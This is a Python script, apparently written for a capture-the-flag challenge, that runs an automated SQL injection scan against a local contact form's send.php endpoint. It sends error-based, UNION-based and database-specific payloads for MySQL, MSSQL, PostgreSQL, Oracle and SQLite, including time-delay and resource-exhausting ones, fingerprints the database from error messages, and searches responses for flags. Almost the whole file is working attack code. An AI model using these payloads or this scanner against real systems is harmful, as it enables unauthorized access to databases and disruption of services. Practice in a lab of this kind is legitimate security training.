import requests
import re
import time

base_url = "http://127.0.0.1:32826/send.php"
parameters = ["fullname", "email", "phone", "subject", "message"]

print("=" * 60)
print("ERROR-BASED & UNION SQL INJECTION TESTING")
print(f"Target: {base_url}")
print("=" * 60)

# Error-based payloads that should trigger database errors
error_payloads = [
    "'",  # Trigger syntax error
    '"',  # Trigger syntax error
    "`",  # MySQL backtick error
    "')",  # Trigger mismatch
    "'\"",  # Mismatched quotes
    "1/0",  # Division by zero
    "' AND (SELECT * FROM nonexistent_table)-- ",
    "' UNION SELECT * FROM information_schema.tables-- ",
    "' OR 1=1-- ",
    "admin'-- ",
    "1' OR '1'='1",
    "1' WAITFOR DELAY '0:0:5'--",
]

# UNION-based payload patterns
union_payloads = [
    "' UNION SELECT 1,2,3,4,5,6-- ",
    "' UNION SELECT null,null,null,null,null,null-- ",
    "' UNION SELECT @@version(),user(),database(),4,5,6-- ",
    "' UNION SELECT 1,2,3,4,5 FROM information_schema.tables-- ",
]

# MSSQL specific payloads
mssql_payloads = [
    "' AND @@version=@@version-- ",
    "' UNION SELECT @@version,db_name(),user_name(),4,5,6-- ",
    "' WAITFOR DELAY '0:0:3'-- ",
]

# PostgreSQL specific payloads
postgres_payloads = [
    "' UNION SELECT version(),current_database(),current_user,4,5,6-- ",
    "' OR pg_sleep(3) -- ",
    "' UNION SELECT 1,2,3,4,5 FROM pg_tables-- ",
]

# Oracle specific payloads
oracle_payloads = [
    "' UNION SELECT banner,2,3,4,5,6 FROM v$version WHERE rownum=1-- ",
    "' UNION SELECT 1,2,3,4,5 FROM all_tables WHERE rownum<=10-- ",
]

# SQLite specific payloads
sqlite_payloads = [
    "' UNION SELECT sqlite_version(),2,3,4,5,6-- ",
    "' UNION SELECT tbl_name,2,3,4,5,6 FROM sqlite_master WHERE type='table'-- ",
    "' AND 1=randomblob(1000000000)-- "
]

# All payloads combined
all_payloads = {
    "error_basic": error_payloads,
    "union": union_payloads,
    "mssql": mssql_payloads,
    "postgres": postgres_payloads,
    "oracle": oracle_payloads,
    "sqlite": sqlite_payloads
}

def search_flags(text, source):
    """Search for flags in response text"""
    flags = re.findall(r'FLAG\{[^}]+\}', text, re.IGNORECASE)
    if flags:
        print(f"\n[!] FLAG FOUND in {source}:")
        for flag in flags:
            print(f"[!] {flag}")
        return flags
    # Also search for flag-like patterns
    suspicious = re.findall(r'[A-F0-9]{32,}', text)
    if suspicious:
        print(f"[+] Found suspicious hex strings in {source}: {suspicious[:5]}")
    return []

def test_parameter(param, payload_type, payload):
    """Test a specific parameter with a payload"""
    data = {p: "test" for p in parameters}
    data[param] = payload
    
    print(f"\n[*] Testing {param} with {payload_type}")
    print(f"[*] Payload: {payload[:80]}...")
    
    try:
        start_time = time.time()
        response = requests.post(base_url, data=data, timeout=15)
        elapsed = time.time() - start_time
        
        print(f"[+] Status: {response.status_code} | Time: {elapsed:.2f}s | Size: {len(response.text)}B")
        
        # Check for common error patterns
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"mysql_fetch",
            r"pg_query",
            r"PostgreSQL.*ERROR",
            r"ORA-\d+",
            r"Oracle.*error",
            r"SQLite.*error",
            r"sqlite_",
            r"Microsoft OLE DB",
            r"ODBC SQL Server Driver",
            r"SQLServer",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"SQL syntax",
            r"database error",
            r"SQL.*error",
            r"mysql.*",
            r"mysqli.*",
            r"PDOException",
            r"SQLSTATE",
        ]
        
        errors_found = []
        for pattern in error_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                errors_found.extend(matches)
        
        if errors_found:
            print(f"[!] POTENTIAL SQL ERROR DETECTED!")
            for err in set(errors_found):
                print(f"  - {err}")
        
        # Look for database-specific content
        db_indicators = {
            "MySQL": ["mysql", "MariaDB", "InnoDB"],
            "PostgreSQL": ["PostgreSQL", "postgres"],
            "MSSQL": ["Microsoft SQL", "SQL Server", "mssql"],
            "Oracle": ["Oracle", "ORA-", "PL/SQL"],
            "SQLite": ["SQLite", "sqlite_"]
        }
        
        detected_dbs = []
        for db, indicators in db_indicators.items():
            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    detected_dbs.append(db)
                    break
        
        if detected_dbs:
            print(f"[!] Database indicators detected: {', '.join(set(detected_dbs))}")
        
        # Search for flags
        flags = search_flags(response.text, f"{param} - {payload_type}")
        if flags:
            return True, flags, elapsed, response.text
            
        # Check if response differs from baseline
        return len(errors_found) > 0 or len(detected_dbs) > 0, None, elapsed, response.text
        
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[-] Error: {str(e)} | Time: {elapsed:.2f}s")
        return False, None, elapsed, str(e)

# Test each parameter with all payload types
results = {}
vulnerable_params = []

for param in parameters:
    print("\n" + "="*60)
    print(f"TESTING PARAMETER: {param.upper()}")
    print("="*60)
    
    param_vulnerable = False
    for payload_type, payloads in all_payloads.items():
        print(f"\n[*] Testing {payload_type.upper()} payloads...")
        for i, payload in enumerate(payloads):
            is_vuln, flags, elapsed, response = test_parameter(param, f"{payload_type}_{i}", payload)
            if flags:
                print(f"\n[!] CRITICAL: FLAG FOUND!")
                vulnerable_params.append((param, payload_type, payload, "FLAG_FOUND"))
                param_vulnerable = True
                break
            if is_vuln:
                vulnerable_params.append((param, payload_type, payload, elapsed))
                param_vulnerable = True
        if param_vulnerable:
            break

# Summary
print("\n" + "="*60)
print("TESTING SUMMARY")
print("="*60)

if vulnerable_params:
    print(f"[!] Found potentially vulnerable parameters: {len(vulnerable_params)}")
    for param, payload_type, payload, info in vulnerable_params:
        print(f"\n  Parameter: {param}")
        print(f"  Type: {payload_type}")
        print(f"  Info: {info}")
        print(f"  Payload: {payload[:80]}...")
else:
    print("[-] No SQL injection vulnerabilities detected with current payloads")
    print("[*] Recommendations:")
    print("  1. Check if form data is displayed elsewhere (view.php, admin.php)")
    print("  2. Try different payload encoding")
    print("  3. Test with authenticated sessions")
    print("  4. Check for second-order SQL injection")

print("\n" + "="*60)
print("TESTING COMPLETE")
print("="*60)

